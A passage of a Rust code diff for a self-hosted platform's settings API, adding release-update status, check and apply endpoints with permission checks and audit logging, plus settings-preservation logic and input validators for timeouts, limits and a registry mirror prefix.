+        temps_core::node_pki::ca_fingerprint_sha256(&cluster_ca.cert_pem).map_err(|error| {
+            error!(%error, "Failed to fingerprint initialized cluster CA");
+            ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+                .title("Cluster CA Initialization Failed")
+                .detail("The enrollment token was not created because the cluster trust root could not be fingerprinted. Check the server logs for details.")
+                .build()
+        })?,
+    );
 
     let params = crate::enrollment_tokens::MintParams {
         max_uses: req.max_uses.unwrap_or(1),
@@ -660,6 +1205,450 @@ async fn revoke_enrollment_token(
     }))
 }
 
+/// Result of the background release-update check, driving the web console's
+/// upgrade banner. All optional fields are set together iff
+/// `update_available` is true.
+#[derive(Debug, Serialize, ToSchema)]
+pub struct UpdateStatusResponse {
+    /// True when a newer release than the running binary has been published
+    /// on this install's channel.
+    pub update_available: bool,
+    /// Version tag of the running binary, e.g. `v0.1.0-beta.45`.
+    pub current_version: Option<String>,
+    /// Newest published tag on this install's channel.
+    pub latest_version: Option<String>,
+    /// Channel the install tracks: `stable` or `beta`.
+    pub channel: Option<String>,
+    /// Release-notes page (GitHub release) for the newer version.
+    pub release_url: Option<String>,
+    /// When the check that found the update ran (ISO 8601, UTC).
+    pub checked_at: Option<String>,
+    /// Docs page with upgrade instructions. Always present so the UI links
+    /// the same page regardless of update state.
+    pub docs_url: String,
+}
+
+/// Report whether a newer temps release is available for this install.
+#[utoipa::path(
+    tag = "Settings",
+    get,
+    path = "/settings/update-status",
+    responses(
+        (status = 200, description = "Release update status for this install", body = UpdateStatusResponse),
+        (status = 401, description = "Unauthorized"),
+        (status = 403, description = "Insufficient permissions")
+    ),
+    security(("bearer_auth" = []))
+)]
+async fn get_update_status(
+    RequireAuth(auth): RequireAuth,
+    State(app_state): State<Arc<SettingsState>>,
+) -> Result<impl IntoResponse, Problem> {
+    permission_guard!(auth, SettingsRead);
+
+    let update = app_state.update_status.as_ref().and_then(|slot| slot.get());
+    let response = match update {
+        Some(update) => UpdateStatusResponse {
+            update_available: true,
+            current_version: Some(update.current_version),
+            latest_version: Some(update.latest_version),
+            channel: Some(update.channel),
+            release_url: Some(update.release_url),
+            checked_at: Some(
+                update
+                    .checked_at
+                    .to_rfc3339_opts(chrono::SecondsFormat::Secs, true),
+            ),
+            docs_url: temps_core::UPGRADE_DOCS_URL.to_string(),
+        },
+        // Covers both "up to date" and "no check has succeeded yet" — the
+        // banner is advisory, so the UI treats them identically.
+        None => UpdateStatusResponse {
+            update_available: false,
+            current_version: None,
+            latest_version: None,
+            channel: None,
+            release_url: None,
+            checked_at: None,
+            docs_url: temps_core::UPGRADE_DOCS_URL.to_string(),
+        },
+    };
+
+    Ok(Json(response))
+}
+
+// ── Applying a release from the console ──────────────────────────────────────
+
+/// Whether this install can apply a release update on request, and how the last
+/// attempt went.
+///
+/// Deliberately answerable even when the answer is "no": an operator who cannot
+/// use the button still needs to know *why* and what to run instead, so this
+/// never 404s or returns an empty body when the feature is unavailable.
+#[derive(Debug, Serialize, ToSchema)]
+pub struct UpdateCapabilityResponse {
+    /// True only when a request would actually download, install and restart.
+    pub can_apply: bool,
+    /// Whether the *caller* holds `platform:update`. Distinct from `can_apply`,
+    /// which describes the server: the console shows the action only when both
+    /// are true, so a reader is never offered a button that would 403.
+    pub allowed: bool,
+    /// Machine-readable reason `can_apply` is false (`disabled_by_flag`,
+    /// `disabled_by_setting`, `container`, `no_supervisor`, `binary_not_writable`,
+    /// `unsupported_platform`, `in_progress`).
+    pub blocker: Option<temps_core::SelfUpdateBlocker>,
+    /// Operator-facing explanation of `blocker`.
+    pub reason: Option<String>,
+    /// Non-blocking warning to show with the confirmation (split topology).
+    pub caveat: Option<String>,
+    /// The equivalent command to run by hand. Always present.
+    pub manual_command: String,
+    /// Version tag of the running binary. Always present — the version page
+    /// needs it whether or not an update exists.
+    pub current_version: String,
+    /// Channel actually tracked, after applying the configured override or
+    /// falling back to inference from the running version tag.
+    pub channel: String,
+    /// True when `channel` was set explicitly in settings rather than inferred.
+    pub channel_is_pinned: bool,
+    /// What would restart the process: `systemd`, `launchd`, `container`, `none`.
+    pub supervisor: temps_core::SupervisorKind,
+    /// `automatic` when applying an update also restarts temps; `manual` when
+    /// it only installs the binary and the operator restarts on their own
+    /// schedule. Lets the console set expectations before the click.
+    pub restart_mode: temps_core::SelfUpdateRestartMode,
+    /// Binary that would be replaced.
+    pub binary_path: String,
+    /// Phase of an in-flight attempt: `idle` when none is running.
+    pub phase: temps_core::SelfUpdatePhase,
+    /// Failure detail while `phase` is `failed`.
+    pub phase_error: Option<String>,
+    /// Most recent attempt, including one resolved during this boot — this is
+    /// how the console reports the outcome of an update that restarted it.
+    pub last_attempt: Option<temps_core::SelfUpdateAttempt>,
+    /// Number of migrations applied so far. `Some` while `phase` is `migrating`.
+    pub migrations_applied: Option<u32>,
+    /// Total migrations to be applied. `Some` once the migrate child has
+    /// reported its first `started` event.
+    pub migrations_total: Option<u32>,
+    /// Name of the migration currently running. `Some` while `phase` is
+    /// `migrating` and a migration step is in flight.
+    pub current_migration_name: Option<String>,
+}
+
+/// Optional pin for the version to install.
+#[derive(Debug, Default, Deserialize, ToSchema)]
+pub struct StartUpdateRequest {
+    /// Release tag to install (e.g. `v0.2.0`). Omit to take the newest release
+    /// on the channel this install already tracks.
+    pub version: Option<String>,
+}
+
+/// Acknowledgement that an update was accepted and is running.
+#[derive(Debug, Serialize, ToSchema)]
+pub struct StartUpdateResponse {
+    /// Version the server is running as it accepts this request.
+    pub current_version: String,
+    /// How long to allow for the server to come back before treating the
+    /// restart as failed. `0` when nothing restarts.
+    pub estimated_restart_secs: u64,
+    /// `automatic` (temps restarts itself) or `manual` (installed only).
+    pub restart_mode: temps_core::SelfUpdateRestartMode,
+    pub message: String,
+}
+
+/// Read the database-backed half of the update policy.
+///
+/// Fails CLOSED: if settings cannot be read we must not report (or act on) a
+/// capability the operator may have deliberately turned off.
+async fn load_self_update_policy(app_state: &SettingsState) -> temps_core::SelfUpdatePolicy {
+    match app_state.config_service.get_settings().await {
+        Ok(settings) => {
+            let self_update = settings.self_update();
+            temps_core::SelfUpdatePolicy {
+                enabled: self_update.enabled,
+                channel: self_update.channel,
+            }
+        }
+        Err(e) => {
+            error!("Could not read self-update settings, treating as disabled: {e}");
+            temps_core::SelfUpdatePolicy {
+                enabled: false,
+                channel: None,
+            }
+        }
+    }
+}
+
+/// Build the "no updater registered in this process" answer.
+///
+/// Reached in hosts that run the settings API without owning the process
+/// lifecycle. Reported as a capability with a reason rather than an error, so
+/// the console renders the same explain-and-point-at-the-CLI surface it uses
+/// for every other blocked state.
+fn updater_unavailable_response(allowed: bool) -> UpdateCapabilityResponse {
+    UpdateCapabilityResponse {
+        can_apply: false,
+        allowed,
+        blocker: Some(temps_core::SelfUpdateBlocker::NotSupported),
+        reason: Some(
+            "This process does not manage the temps binary, so it cannot apply an update. \
+             Upgrade from the command line on the host instead."
+                .to_string(),
+        ),
+        caveat: None,
+        manual_command: "temps upgrade".to_string(),
+        current_version: String::new(),
+        channel: "unknown".to_string(),
+        channel_is_pinned: false,
+        supervisor: temps_core::SupervisorKind::None,
+        restart_mode: temps_core::SelfUpdateRestartMode::Manual,
+        binary_path: String::new(),
+        phase: temps_core::SelfUpdatePhase::Idle,
+        phase_error: None,
+        last_attempt: None,
+        migrations_applied: None,
+        migrations_total: None,
+        current_migration_name: None,
+    }
+}
+
+/// Ask the release API for the newest version on this install's channel, now,
+/// instead of waiting for the background notifier's next pass.
+#[utoipa::path(
+    tag = "Settings",
+    post,
+    path = "/settings/update/check",
+    responses(
+        (status = 200, description = "Result of the release check", body = temps_core::ReleaseCheckResult),
+        (status = 401, description = "Unauthorized"),
+        (status = 403, description = "Insufficient permissions"),
+        (status = 502, description = "The release API could not be reached", body = temps_core::ProblemDetails),
+        (status = 501, description = "This process cannot check for updates", body = temps_core::ProblemDetails)
+    ),
+    security(("bearer_auth" = []))
+)]
+async fn check_for_update(
+    RequireAuth(auth): RequireAuth,
+    State(app_state): State<Arc<SettingsState>>,
+) -> Result<impl IntoResponse, Problem> {
+    // A read-only network probe that changes no state the operator can't
+    // already see, so it sits with the rest of the settings reads.
+    permission_guard!(auth, SettingsRead);
+
+    let Some(updater) = app_state.self_updater.as_ref() else {
+        return Err(ErrorBuilder::new(StatusCode::NOT_IMPLEMENTED)
+            .title("Update Checks Not Supported Here")
+            .detail("This process does not track temps releases.")
+            .build());
+    };
+
+    let policy = load_self_update_policy(&app_state).await;
+    let result = updater.check_now(policy.channel).await.map_err(|reason| {
+        // Upstream reachability, not a client mistake — say so plainly so the
+        // operator looks at egress rather than at their own request.
+        ErrorBuilder::new(StatusCode::BAD_GATEWAY)
+            .title("Release Check Failed")
+            .detail(reason)
+            .build()
+    })?;
+
+    Ok(Json(result))
+}
+
+/// Report whether a release update can be applied from the console.
+#[utoipa::path(
+    tag = "Settings",
+    get,
+    path = "/settings/update",
+    responses(
+        (status = 200, description = "Self-update capability for this install", body = UpdateCapabilityResponse),
+        (status = 401, description = "Unauthorized"),
+        (status = 403, description = "Insufficient permissions")
+    ),
+    security(("bearer_auth" = []))
+)]
+async fn get_update_capability(
+    RequireAuth(auth): RequireAuth,
+    State(app_state): State<Arc<SettingsState>>,
+) -> Result<impl IntoResponse, Problem> {
+    // Readable by anyone who can read settings: the banner needs this to decide
+    // what to render. Actually *starting* an update needs `platform:update`,
+    // reported separately as `allowed`.
+    permission_guard!(auth, SettingsRead);
+
+    let allowed = auth.has_permission(&temps_auth::Permission::PlatformUpdate);
+
+    let Some(updater) = app_state.self_updater.as_ref() else {
+        return Ok(Json(updater_unavailable_response(allowed)));
+    };
+
+    let capability = updater.capability(&load_self_update_policy(&app_state).await);
+    Ok(Json(UpdateCapabilityResponse {
+        // Describes the SERVER only. Permission is reported separately as
+        // `allowed` so a blocked install and an under-privileged caller stay
+        // distinguishable — collapsing them would leave the UI unable to say
+        // which of the two it is looking at.
+        can_apply: capability.can_apply,
+        allowed,
+        blocker: capability.blocker,
+        reason: capability.reason,
+        caveat: capability.caveat,
+        manual_command: capability.manual_command,
+        current_version: capability.current_version,
+        channel: capability.channel,
+        channel_is_pinned: capability.channel_is_pinned,
+        supervisor: capability.supervisor,
+        restart_mode: capability.restart_mode,
+        // Host filesystem layout is only useful to someone who can actually
+        // run an update; readers with `settings:read` alone get nothing from
+        // it but a hint about where the install lives.
+        binary_path: if allowed {
+            capability.binary_path
+        } else {
+            String::new()
+        },
+        phase: capability.phase,
+        phase_error: capability.phase_error,
+        last_attempt: capability.last_attempt,
+        migrations_applied: capability.migrations_applied,
+        migrations_total: capability.migrations_total,
+        current_migration_name: capability.current_migration_name,
+    }))
+}
+
+/// Install a release and restart the server.
+///
+/// Returns as soon as the attempt is accepted: the download and swap run in the
+/// background and the process then exits so its supervisor restarts it on the
+/// new binary. Poll `GET /settings/update` for progress — after the restart,
+/// `last_attempt` carries the outcome.
+#[utoipa::path(
+    tag = "Settings",
+    post,
+    path = "/settings/update",
+    request_body = StartUpdateRequest,
+    responses(
+        (status = 202, description = "Update accepted; the server will restart", body = StartUpdateResponse),
+        (status = 401, description = "Unauthorized"),
+        (status = 403, description = "Insufficient permissions"),
+        (status = 409, description = "Update unavailable or already running", body = temps_core::ProblemDetails),
+        (status = 501, description = "This process cannot apply updates", body = temps_core::ProblemDetails)
+    ),
+    security(("bearer_auth" = []))
+)]
+async fn start_update(
+    RequireAuth(auth): RequireAuth,
+    State(app_state): State<Arc<SettingsState>>,
+    Extension(metadata): Extension<RequestMetadata>,
+    Json(request): Json<StartUpdateRequest>,
+) -> Result<impl IntoResponse, Problem> {
+    // NOT SettingsWrite: replacing the running binary and dropping every
+    // in-flight request is a different class of action from editing a config
+    // value, so it carries its own permission.
+    permission_guard!(auth, PlatformUpdate);
+
+    let Some(updater) = app_state.self_updater.as_ref() else {
+        return Err(ErrorBuilder::new(StatusCode::NOT_IMPLEMENTED)
+            .title("Self-Update Not Supported Here")
+            .detail(
+                "This process does not manage the temps binary. Upgrade from the command line \
+                 on the host with `temps upgrade`.",
+            )
+            .build());
+    };
+
+    let started = updater
+        .start(
+            request.version.clone(),
+            Some(auth.user_id()),
+            &load_self_update_policy(&app_state).await,
+        )
+        .map_err(self_update_error_to_problem)?;
+
+    // Audited BEFORE the restart — the process is about to exit, and an update
+    // that leaves no trace of who triggered it is exactly the record an
+    // operator needs afterwards.
+    let audit = PlatformUpdateStartedAudit {
+        context: AuditContext {
+            user_id: auth.user_id(),
+            ip_address: Some(metadata.ip_address.clone()),
+            user_agent: metadata.user_agent.clone(),
+        },
+        from_version: started.current_version.clone(),
+        target_version: request.version.clone(),
+    };
+    if let Err(e) = app_state.audit_service.create_audit_log(&audit).await {
+        error!("Failed to create audit log for platform update: {}", e);
+    }
+
+    info!(
+        user_id = auth.user_id(),
+        from = %started.current_version,
+        target = ?request.version,
+        "Platform update started from the console"
+    );
+
+    Ok((
+        StatusCode::ACCEPTED,
+        Json(StartUpdateResponse {
+            current_version: started.current_version,
+            estimated_restart_secs: started.estimated_restart_secs,
+            restart_mode: started.restart_mode,
+            message: match started.restart_mode {
+                temps_core::SelfUpdateRestartMode::Automatic => {
+                    "Update started. The server will restart when the new binary is installed."
+                }
+                temps_core::SelfUpdateRestartMode::Manual => {
+                    "Update started. The new binary will be installed, but temps keeps running \
+                     the current version until you restart it."
+                }
+            }
+            .to_string(),
+        }),
+    ))
+}
+
+fn self_update_error_to_problem(error: temps_core::SelfUpdateError) -> Problem {
+    use temps_core::{SelfUpdateBlocker, SelfUpdateError};
+    let status = match error {
+        // These describe current state the caller can change (a flag, a
+        // setting, a running attempt) rather than a malformed request.
+        SelfUpdateError::Unavailable { .. } | SelfUpdateError::AlreadyRunning { .. } => {
+            StatusCode::CONFLICT
+        }
+        // A bad argument, not a state of the install.
+        SelfUpdateError::InvalidVersion { .. } => StatusCode::BAD_REQUEST,
+    };
+    let Some(blocker) = error.blocker() else {
+        return ErrorBuilder::new(status)
+            .title("Invalid Version")
+            .detail(error.to_string())
+            .build();
+    };
+    let title = match blocker {
+        SelfUpdateBlocker::DisabledByFlag | SelfUpdateBlocker::DisabledBySetting => {
+            "Self-Update Disabled"
+        }
+        SelfUpdateBlocker::InProgress => "Update Already Running",
+        SelfUpdateBlocker::NotSupported => "Self-Update Not Supported Here",
+        SelfUpdateBlocker::BinaryNotWritable => "Binary Not Writable",
+        SelfUpdateBlocker::UnsupportedPlatform => "Unsupported Platform",
+    };
+    ErrorBuilder::new(status)
+        .title(title)
+        .detail(error.to_string())
+        .value(
+            "blocker",
+            serde_json::to_value(blocker)
+                .unwrap_or(serde_json::Value::Null)
+                .as_str()
+                .unwrap_or_default()
+                .to_string(),
+        )
+        .build()
+}
+
 /// Get application settings
 #[utoipa::path(
     tag = "Settings",
@@ -680,14 +1669,47 @@ async fn get_settings(
 ) -> Result<impl IntoResponse, Problem> {
     permission_guard!(auth, SettingsRead);
 
-    match app_state.config_service.get_settings().await {
+    let (settings_result, policies_result, monitored_services_result, cluster_network_result) = tokio::join!(
+        app_state.config_service.get_settings(),
+        app_state.config_service.get_effective_telemetry_policies(),
+        app_state.config_service.count_monitored_services(),
+        app_state.config_service.get_cluster_network_state(),
+    );
+
+    match settings_result {
         Ok(settings) => {
             // Convert to response type that masks sensitive fields, then
             // reconcile the effective metrics store with the server's
             // ClickHouse env-var configuration so the UI shows the backend the
             // runtime actually uses (not just the DB toggle).
+            let policies = policies_result.unwrap_or_else(|error| {
+                tracing::warn!(
+                    %error,
+                    "Failed to read effective TimescaleDB policies; using configured values"
+                );
+                EffectiveTelemetryPolicies::default()
+            });
+            let monitored_services_count = monitored_services_result
+                .inspect_err(|error| {
+                    tracing::warn!(
+                        %error,
+                        "Failed to count monitored services; storage estimate is unavailable"
+                    );
+                })
+                .ok();
+            let cluster_network_state = cluster_network_result
+                .inspect_err(|error| {
+                    tracing::warn!(
+                        %error,
+                        "Failed to read cluster network state; CIDR controls are unavailable"
+                    );
+                })
+                .ok();
             let response = AppSettingsResponse::from(settings)
-                .with_effective_store(app_state.config_service.is_clickhouse_enabled());
+                .with_effective_store(app_state.config_service.is_clickhouse_enabled())
+                .with_effective_timescale_state(policies, monitored_services_count)
+                .with_cluster_network_state(cluster_network_state)
+                .with_proxy_port(app_state.config_service.proxy_port());
             Ok(Json(response))
         }
         Err(e) => {
@@ -752,6 +1774,114 @@ fn preserve_self_recorded_fields(incoming: &mut AppSettings, current: &AppSettin
     incoming.console_version = current.console_version.clone();
 }
 
+/// Keep security-relevant settings the client did not mention.
+///
+/// The settings PUT replaces the whole document and `AppSettings` deserializes
+/// with `#[serde(default)]`, so a field a client omits is indistinguishable
+/// from one it reset. That is harmless for presentation settings and dangerous
+/// for `self_update`: an operator who deliberately forbade console updates
+/// would have that silently undone by any unrelated save from a client built
+/// before the field existed — including a published CLI, or a stale browser
+/// tab. Absence therefore means "leave it alone", and only an explicit value
+/// changes it.
+fn preserve_omitted_security_fields(incoming: &mut AppSettings, current: &AppSettings) {
+    if incoming.self_update.is_none() {
+        incoming.self_update = current.self_update.clone();
+    }
+}
+
+/// Which of the operator-tuned `cloud.*` keys a `PUT /settings` body actually
+/// carried.
+///
+/// `AppSettings` deserializes with `#[serde(default)]` at every level, so a body
+/// that never mentions `cloud` produces a `CloudSettings::default()` that is —
+/// once deserialization is done — indistinguishable from one where the client
+/// spelled every default out. That is the whole bug this type exists to fix: the
+/// console's own save has never sent a `cloud` block, so any unrelated settings
+/// save silently reset the ADR-041 outbox ceiling and both ADR-042 spend guards
+/// to their build-time defaults. Worse than the reset, an operator who had
+/// *narrowed* the anomaly factor also had their next unrelated save refused with
+/// a 403, because the guard authorization compares the incoming factor against
+/// the stored one and an absent field reads as "widen it back to 5x".
+///
+/// Absence is therefore read off the wire, once, *before* the body becomes an
+/// `AppSettings`. The obvious cheaper alternative — "if the value equals the
+/// default, treat it as absent" — cannot work here: three of these four fields
+/// have a non-sentinel default, so that rule makes the default unwritable. An
+/// operator who narrowed the factor to 2x could never put it back to 5x, and one
+/// who pointed `backend_url` at a staging Cloud could never point it home again.
+///
+/// An explicit `null` counts as **sent**: a client writing
+/// `"telemetry_bulk_rate_limit_spans_per_sec": null` is asking to clear the
+/// throttle, and honouring that is precisely why presence is tracked rather than
+/// inferred from the value.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
+struct CloudFieldsSent {
+    backend_url: bool,
+    telemetry_outbox_max_bytes: bool,
+    telemetry_bulk_rate_limit_spans_per_sec: bool,
+    telemetry_bulk_anomaly_factor: bool,
+}
+
+impl CloudFieldsSent {
+    /// Read key presence from a raw settings document. A `cloud` member that is
+    /// missing, or present but not an object, means the client sent none of
+    /// these fields — a non-object is rejected moments later by deserialization
+    /// anyway, so "sent nothing" is both true and the safe answer.
+    fn from_settings_body(body: &serde_json::Value) -> Self {
+        let Some(cloud) = body.get("cloud").and_then(serde_json::Value::as_object) else {
+            return Self::default();
+        };
+        Self {
+            backend_url: cloud.contains_key("backend_url"),
+            telemetry_outbox_max_bytes: cloud.contains_key("telemetry_outbox_max_bytes"),
+            telemetry_bulk_rate_limit_spans_per_sec: cloud
+                .contains_key("telemetry_bulk_rate_limit_spans_per_sec"),
+            telemetry_bulk_anomaly_factor: cloud.contains_key("telemetry_bulk_anomaly_factor"),
+        }
+    }
+}
+
+/// Keep the parts of the `cloud` block a generic settings write must not change:
+/// the export consent flags always, and every operator-tuned field the client
+/// did not send.
+///
+/// Two rules, both consequences of `PUT /settings` replacing the whole document:
+///
+/// - **Consent is never writable through this endpoint.** Enabling a Cloud
+///   export requires resource-specific permissions and goes through
+///   `PATCH /cloud/features`; a generic settings write must not bypass those
+///   guards even when it submits a complete `AppSettings`. Restored from the DB
+///   unconditionally, whether the client sent it or not.
+/// - **A field the client did not send keeps its stored value.** Applies to
+///   `backend_url` and `telemetry_outbox_max_bytes` (ADR-041) and to both
+///   bulk-activation guards (ADR-042 §3, §6.3). See [`CloudFieldsSent`] for why
+///   "did not send" is read from the request body rather than inferred from the
+///   deserialized value.
+fn preserve_cloud_settings_not_sent_by_every_client(
+    incoming: &mut AppSettings,
+    current: &AppSettings,
+    sent: CloudFieldsSent,
+) {
+    incoming.cloud.telemetry_enabled = current.cloud.telemetry_enabled;
+    incoming.cloud.backups_enabled = current.cloud.backups_enabled;
+    incoming.cloud.notifications_enabled = current.cloud.notifications_enabled;
+
+    if !sent.backend_url {
+        incoming.cloud.backend_url = current.cloud.backend_url.clone();
+    }
+    if !sent.telemetry_outbox_max_bytes {
+        incoming.cloud.telemetry_outbox_max_bytes = current.cloud.telemetry_outbox_max_bytes;
+    }
+    if !sent.telemetry_bulk_rate_limit_spans_per_sec {
+        incoming.cloud.telemetry_bulk_rate_limit_spans_per_sec =
+            current.cloud.telemetry_bulk_rate_limit_spans_per_sec;
+    }
+    if !sent.telemetry_bulk_anomaly_factor {
+        incoming.cloud.telemetry_bulk_anomaly_factor = current.cloud.telemetry_bulk_anomaly_factor;
+    }
+}
+
 /// Trim and validate an optional URL setting (`external_url`/`internal_url`).
 /// A blank value (after trimming) means "unset" and is normalized to `None`
 /// rather than rejected -- `external_url` previously validated the raw
@@ -796,6 +1926,367 @@ fn sanitize_optional_url(
     Ok(Some(trimmed))
 }
 
+/// Trim and validate `registry_mirror_prefix`, rejecting anything outside a
+/// registry host+path's character set (alphanumerics, `.`, `-`, `_`, `:`,
+/// `/`).
+///
+/// This is the write-time half of the injection defense: `qualify_with_registry_prefix`
+/// (`temps-core::registry_prefix`) already refuses to splice a malformed
+/// prefix into a Dockerfile at build time, but rejecting here means an
+/// operator gets an immediate 400 explaining why, instead of the prefix
+/// silently never applying to any build. Reuses `temps_core`'s allowlist
+/// rather than re-deriving it, so the write-time check and the build-time
+/// check can never drift apart.
+fn sanitize_registry_mirror_prefix(prefix: Option<String>) -> Result<Option<String>, Problem> {
+    let Some(raw) = prefix else {
+        return Ok(None);
+    };
+
+    let trimmed = raw.trim().trim_end_matches('/').to_string();
+    if trimmed.is_empty() {
+        return Ok(None);
+    }
+
+    if !temps_core::registry_prefix::is_valid_registry_prefix(&trimmed) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Invalid Registry Mirror Prefix")
+            .detail(
+                "registry_mirror_prefix may only contain letters, digits, '.', '-', '_', ':' and '/'"
+                    .to_string(),
+            )
+            .build());
+    }
+
+    Ok(Some(trimmed))
+}
+
+fn validate_observability_compression(
+    compression: &ObservabilityCompressionSettings,
+) -> Result<(), Problem> {
+    if !(1..=720).contains(&compression.proxy_logs_after_hours) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .detail("observability_compression.proxy_logs_after_hours must be between 1 and 720")
+            .build());
+    }
+    if !(1..=2160).contains(&compression.otel_spans_after_hours) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .detail("observability_compression.otel_spans_after_hours must be between 1 and 2160")
+            .build());
+    }
+    Ok(())
+}
+
+/// Reject a chat turn timeout outside the supported range.
+///
+/// The runtime clamps on read, so an out-of-range value could never break the
+/// chat — but storing one means the settings API echoes back a number that is
+/// not what is in effect, and the form then shows the operator a limit that
+/// isn't real. Rejecting keeps the stored value and the effective value the
+/// same thing, which is the only way the page can be trusted.
+fn validate_ai_chat_limits(limits: &AiChatLimitsSettings) -> Result<(), Problem> {
+    let min = AiChatLimitsSettings::MIN_TURN_TIMEOUT_SECS;
+    let max = AiChatLimitsSettings::MAX_TURN_TIMEOUT_SECS;
+    if !(min..=max).contains(&limits.turn_timeout_secs) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Validation Error")
+            .detail(format!(
+                "ai_chat_limits.turn_timeout_secs must be between {min} and {max} seconds \
+                 (got {})",
+                limits.turn_timeout_secs
+            ))
+            .build());
+    }
+    Ok(())
+}
+
+fn validate_ai_workspace_file_limits(
+    limits: &AiWorkspaceFileLimitsSettings,
+) -> Result<(), Problem> {
+    let invalid = [
+        (
+            "max_files_per_upload",
+            u64::from(limits.max_files_per_upload),
+            1,
+            100,
+        ),
+        (
+            "max_file_size_mb",
+            u64::from(limits.max_file_size_mb),
+            1,
+            32,
+        ),
+        (
+            "max_upload_size_mb",
+            u64::from(limits.max_upload_size_mb),
+            1,
+            32,
+        ),
+        (
+            "max_workspace_size_mb",
+            u64::from(limits.max_workspace_size_mb),
+            1,
+            2_048,
+        ),
+        (
+            "max_workspace_entries",
+            u64::from(limits.max_workspace_entries),
+            1,
+            50_000,
+        ),
+        (
+            "max_text_preview_kb",
+            u64::from(limits.max_text_preview_kb),
+            1,
+            1_024,
+        ),
+        (
+            "max_image_preview_size_mb",
+            u64::from(limits.max_image_preview_size_mb),
+            1,
+            16,
+        ),
+        (
+            "max_download_size_mb",
+            u64::from(limits.max_download_size_mb),
+            1,
+            32,
+        ),
+    ]
+    .into_iter()
+    .find(|(_, value, min, max)| !(*min..=*max).contains(value));
+
+    if let Some((name, value, min, max)) = invalid {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Validation Error")
+            .detail(format!(
+                "ai_workspace_file_limits.{name} must be between {min} and {max} (got {value})"
+            ))
+            .build());
+    }
+    if limits.max_file_size_mb > limits.max_upload_size_mb {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Validation Error")
+            .detail("ai_workspace_file_limits.max_file_size_mb cannot exceed max_upload_size_mb")
+            .build());
+    }
+    if limits.max_image_preview_size_mb > limits.max_download_size_mb {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Validation Error")
+            .detail(
+                "ai_workspace_file_limits.max_image_preview_size_mb cannot exceed max_download_size_mb",
+            )
+            .build());
+    }
+    Ok(())
+}
+
+/// Reject a request-timeout ceiling outside the supported range, or a
+/// nonzero default timeout outside `1..=max`. `0` is accepted as the
+/// explicit "no timeout" state — see the loop below.
+///
+/// The proxy already clamps a stored out-of-range ceiling on read
+/// (`RequestTimeoutSettings::ceiling`) — but storing one anyway would mean
+/// the settings API echoes back a ceiling that isn't actually enforced, and
+/// the form would show the operator a limit that isn't real.
+fn validate_request_timeouts(timeouts: &RequestTimeoutSettings) -> Result<(), Problem> {
+    let min = RequestTimeoutSettings::MIN_CEILING_SECS;
+    let max = RequestTimeoutSettings::MAX_CEILING_SECS;
+    if !(min..=max).contains(&timeouts.max_request_timeout_seconds) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Validation Error")
+            .detail(format!(
+                "request_timeouts.max_request_timeout_seconds must be between {min} and {max} \
+                 seconds (got {})",
+                timeouts.max_request_timeout_seconds
+            ))
+            .build());
+    }
+    // `0` is the valid, default "no timeout" state for each traffic class —
+    // opt-in only, so an existing app with no timeout configured keeps
+    // working unchanged. A nonzero value must still be a sane duration.
+    for (name, value) in [
+        (
+            "default_http_timeout_seconds",
+            timeouts.default_http_timeout_seconds,
+        ),
+        (
+            "default_sse_idle_timeout_seconds",
+            timeouts.default_sse_idle_timeout_seconds,
+        ),
+        (
+            "default_websocket_idle_timeout_seconds",
+            timeouts.default_websocket_idle_timeout_seconds,
+        ),
+    ] {
+        if value != 0 && !(1..=max).contains(&value) {
+            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+                .title("Validation Error")
+                .detail(format!(
+                    "request_timeouts.{name} must be 0 (no timeout) or between 1 and {max} \
+                     seconds (got {value})"
+                ))
+                .build());
+        }
+    }
+    Ok(())
+}
+
+fn validate_monitoring_settings(monitoring: &MonitoringSettings) -> Result<(), Problem> {
+    if monitoring.scrape_interval_secs < 15 {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .detail("monitoring.scrape_interval_secs must be >= 15")
+            .build());
+    }
+    if !(1..=30).contains(&monitoring.retention_raw_days) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .detail("monitoring.retention_raw_days must be between 1 and 30")
+            .build());
+    }
+    if !(7..=365).contains(&monitoring.retention_hourly_days) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .detail("monitoring.retention_hourly_days must be between 7 and 365")
+            .build());
+    }
+    if !(1..=10).contains(&monitoring.retention_daily_years) {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .detail("monitoring.retention_daily_years must be between 1 and 10")
+            .build());
+    }
+    // `monitoring.clickhouse_url` is legacy, optional config: the runtime
+    // builds the ClickHouse metrics store from the server's TEMPS_CLICKHOUSE_*
+    // env configuration (`build_ch_metrics_store`), never from this setting.
+    // Requiring it when store == ClickHouse made the store unswitchable from
+    // the UI (which has no URL field) even on servers where ClickHouse is
+    // fully configured. Validate the URL only when one is supplied; the
+    // env-not-configured case is surfaced by `effective_metrics_store` and
+    // the console's mismatch warning instead of a save-time rejection.
+    if let Some(url) = monitoring
+        .clickhouse_url
+        .as_deref()
+        .filter(|u| !u.trim().is_empty())
+    {
+        if url::Url::parse(url).is_err() {
+            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+                .detail("monitoring.clickhouse_url is not a valid URL")
+                .build());
+        }
+    }
+    Ok(())
+}
+
+/// Reject a bulk-activation anomaly factor outside the supported range.
+///
+/// `effective_bulk_anomaly_factor` clamps on read, so an out-of-range value
+/// could never reach the worker — but silently clamping a write hides the
+/// operator's mistake behind a settings page that echoes back `1000` while the
+/// instance is really running at 50. Worse, it hides it in the one direction
+/// that costs money: an operator who believes they widened the guard to 1000×
+/// and did not is being lied to about their own spend ceiling. Rejecting keeps
+/// the stored value and the effective value the same thing, which is the only
+/// way the page can be trusted.
+fn validate_bulk_activation_guards(cloud: &CloudSettings) -> Result<(), Problem> {
